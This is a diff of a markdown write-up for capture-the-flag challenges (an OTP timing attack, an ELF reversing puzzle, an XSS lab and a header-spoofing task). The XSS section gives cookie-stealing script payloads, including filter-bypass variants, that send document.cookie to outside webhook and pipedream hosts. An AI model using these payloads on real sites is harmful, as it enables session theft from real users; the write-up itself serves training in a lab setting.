@@ -1,9 +1,9 @@
-## 1. Broken OTP
-#Crypto 
+## 1. Broken OTP - Crypto
+
 #### Description
 i heard OTP it the most secure encryption algorithm ever
 #### Given code
-```
+```python
 import random
 secret = 'XXXXXXXXXXXXXXXXXXXX'
 PINK = 118
@@ -45,7 +45,7 @@ if __name__ == '__main__':
 ```
 
 First I de-obfuscated the code with the help of ChatGPT
-```
+```python
 import random
 import time
 
@@ -91,7 +91,7 @@ c = k ^ m So we find k as k = m ^ c
 s ^ k = cs So we find s as s = cs ^ k
 ```
 I used below python script to initiate the timing attack and provide the ciphertexts in both option 1 and 2
-```
+```python
 import pwn
 import threading
 
@@ -126,13 +126,15 @@ print("Both connections handled successfully.")
 ```
 Then I used the method described above to derive the flag 's'.
 **Flag : 2. N0PS{0tP_k3Y_r3u53}**
-## 2. Reverse Me
-#Rev 
+
+## 2. Reverse Me - Rev
+
 #### Description
 Don't complain if you can't see me, because I have to be reversed to make me run 🙃
+
 #### Solution
 The Description says : I have to be reversed to make me run. Opening the file in a hex editor, there was no file signature. Since description says about reversing, I scrolled down to the bottom. There I found that the last 3 letters were "FLE". Reverse it : "ELF" -> "ELF Executable"! When reversed, ELF would form the file signature. I used the below script to reverse the hex values in the file.
-```
+```python
 file = open(<filename>,"r")
 content = file.read()
 content = content.split()
@@ -152,22 +154,23 @@ Solving these 4 equations, we get the numbers -3, 8, -7, -9
 ./reversemeout -3 8 -7 -9
 
 **Flag : N0PS{r1CKUNr0111N6}**
-## 3. XSS Lab
-#Web
+
+## 3. XSS Lab - Web
+
 #### Level 1
 No Filters
-
 Cookie 1 : bf2a73106a3aa48bab9b8b47e4bd350e
 Level 1 : `<script>document.write('<img src="https://webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+document.cookie+'" />');</script>`
+
 #### Level 2
 Filter:
 ```
 def filter_2(payload):
     return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
 ```
-
 Cookie 2 :3e79c8a64bd10f5fa897b7832384f043
 Level 2 : `<scscriptript>document.write('<imimgg src="https://webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+document.cookie+'" />');</scrscriptipt>`
+
 #### Level 3
 Filter:
 ```
@@ -180,9 +183,9 @@ return "Nope"
 return "Nope"
     return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
 ```
-
 Cookie 3 : f40e749b80cff27f8e726b2a95740dd6
 Level 3 : `<scscriptript>docuscriptment.write('<imimgg src="https:/script/webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+docuscriptment.cooscriptkie+'" />');</scrscriptipt>`
+
 #### Level 4
 Filter:
 ```
@@ -198,15 +201,5 @@ return "Nope"
     return payload.replace("script", "").replace("img", "").replace("svg", "")
 
 ```
-
 Cookie 4 : N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
 Level 4 : `<imimgg src=x onerror=this.src=atob('aHR0cHM6Ly9lbnNzNzltbHBscXdzLngucGlwZWRyZWFtLm5ldD9jPQ==').concat(docuscriptment.cooscriptkie)>`
-
-## 4. Outsiders
-#Web 
-#### Description
-_Wish you were here.._
-#### Solution
-Wish you were home.
-Add a request header : `X-Forwarded-For : 127.0.0.1`
-We get the flag.
